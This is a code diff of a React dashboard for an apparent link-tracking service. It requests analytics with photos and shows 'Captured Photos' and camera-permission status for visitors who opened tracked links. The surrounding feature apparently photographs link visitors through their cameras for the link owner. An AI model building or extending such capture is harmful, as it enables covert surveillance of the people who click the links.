@@ -30,8 +30,8 @@ export default function Dashboard() {
 
       // Load analytics from API
       const analyticsUrl = selectedLink
-        ? `/api/analytics?slug=${selectedLink.id}`
-        : "/api/analytics";
+        ? `/api/analytics?slug=${selectedLink.id}&photos=true`
+        : "/api/analytics?photos=true";
 
       const analyticsResponse = await fetch(analyticsUrl);
       const analyticsData = await analyticsResponse.json();
@@ -429,36 +429,35 @@ export default function Dashboard() {
                                   />
                                 </div>
                               )}
-                            {data.photos && data.photos.length > 0 && (
-                              <div className="mt-4 pt-4 border-t border-gray-200">
-                                <div className="flex justify-between items-center mb-2">
-                                  <p className="font-medium text-gray-500">
-                                    📸 Captured Photos (
-                                    {data.photoCount || data.photos.length})
-                                  </p>
-                                  <span className="text-xs bg-green-100 text-green-800 px-2 py-1 rounded">
-                                    {Math.round(
-                                      (data.totalPhotoSize || 0) / 1024
-                                    )}{" "}
-                                    KB total
-                                  </span>
-                                </div>
+                          </div>
 
-                                <div className="grid grid-cols-2 md:grid-cols-3 gap-3">
-                                  {data.photos.map(
-                                    (photo: string, idx: number) => (
-                                      <img
-                                        key={idx}
-                                        src={photo}
-                                        alt={`Captured ${idx + 1}`}
-                                        className="rounded-lg border border-gray-300 shadow-sm hover:scale-105 transition-transform cursor-pointer"
-                                        onClick={() => {
-                                          const modal = window.open(
-                                            "",
-                                            "_blank"
-                                          );
-                                          if (modal) {
-                                            modal.document.write(`
+                          {data.photos && data.photos.length > 0 && (
+                            <div className="mt-4 pt-4 border-t border-gray-200">
+                              <div className="flex justify-between items-center mb-2">
+                                <p className="font-medium text-gray-500">
+                                  📸 Captured Photos (
+                                  {data.photoCount || data.photos.length})
+                                </p>
+                                <span className="text-xs bg-green-100 text-green-800 px-2 py-1 rounded">
+                                  {Math.round(
+                                    (data.totalPhotoSize || 0) / 1024
+                                  )}{" "}
+                                  KB total
+                                </span>
+                              </div>
+
+                              <div className="grid grid-cols-2 md:grid-cols-3 gap-3">
+                                {data.photos.map(
+                                  (photo: string, idx: number) => (
+                                    <img
+                                      key={idx}
+                                      src={photo}
+                                      alt={`Captured ${idx + 1}`}
+                                      className="rounded-lg border border-gray-300 shadow-sm hover:scale-105 transition-transform cursor-pointer"
+                                      onClick={() => {
+                                        const modal = window.open("", "_blank");
+                                        if (modal) {
+                                          modal.document.write(`
                 <html>
                 <head>
                   <title>Captured Photo ${idx + 1}</title>
@@ -470,26 +469,25 @@ export default function Dashboard() {
                 <body><img src="${photo}" /></body>
                 </html>
               `);
-                                          }
-                                        }}
-                                      />
-                                    )
-                                  )}
-                                </div>
+                                        }
+                                      }}
+                                    />
+                                  )
+                                )}
                               </div>
-                            )}
+                            </div>
+                          )}
 
-                            {/* Camera status indicator */}
-                            {!data.photos && data.cameraStatus && (
-                              <div className="mt-2">
-                                <p className="text-xs text-gray-500">
-                                  📷 Camera: {data.cameraStatus}
-                                  {data.cameraStatus === "failed" &&
-                                    " - User denied camera access"}
-                                </p>
-                              </div>
-                            )}
-                          </div>
+                          {/* Camera status indicator */}
+                          {!data.photos && data.cameraStatus && (
+                            <div className="mt-2">
+                              <p className="text-xs text-gray-500">
+                                📷 Camera: {data.cameraStatus}
+                                {data.cameraStatus === "failed" &&
+                                  " - User denied camera access"}
+                              </p>
+                            </div>
+                          )}
 
                           {/* Detailed Information Grid */}
                           <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4 text-sm">
